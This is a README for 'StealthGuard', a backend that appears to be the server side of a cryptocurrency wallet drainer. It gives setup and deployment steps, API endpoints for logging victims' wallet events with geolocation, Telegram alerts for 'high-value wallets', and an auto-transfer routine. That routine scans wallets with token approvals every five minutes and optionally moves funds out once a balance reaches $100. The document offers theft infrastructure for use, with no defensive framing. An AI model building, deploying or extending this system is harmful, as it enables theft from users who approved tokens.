# StealthGuard Backend

## Features

- **REST API**: Receive logs from frontend
- **MongoDB Storage**: All events and wallet data
- **Geolocation**: IP → Country/City
- **Price Tracking**: CoinGecko integration
- **Auto-Transfer Monitor**: Background service that scans approved wallets
- **Telegram Alerts**: Notifications for high-value wallets
- **WebSocket**: Real-time updates to admin panel
- **Admin Dashboard**: HTML dashboard with stats

## Setup

```bash
# Install dependencies
npm install

# Create .env file
cp .env.example .env
# Edit .env with your settings

# Start server
npm start

# Dev mode with auto-reload
npm run dev
```

## Environment Variables

```env
MONGODB_URI=mongodb://localhost:27017/stealthguard
PORT=3000
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
ENABLE_MONITOR=true
```

## API Endpoints

- `POST /api/log` - Log single event
- `POST /api/log/batch` - Log batch of events
- `GET /api/dashboard` - Dashboard stats
- `GET /api/stats/countries` - Stats by country
- `GET /api/stats/amounts` - Amount distribution
- `GET /api/wallets/hot` - Hot wallets list

## Deployment

### Render (Recommended)
1. Create new Web Service
2. Connect GitHub repo
3. Set environment variables
4. Deploy!

### MongoDB Atlas
1. Create free cluster
2. Get connection string
3. Add to MONGODB_URI

## Auto-Transfer Logic

1. Monitor runs every 5 minutes
2. Checks wallets with approved tokens
3. Fetches current balances via RPC
4. Calculates USD value (CoinGecko prices)
5. If balance >= $100:
   - Logs event
   - Sends Telegram alert
   - (Optional) Executes transfer with secure signer
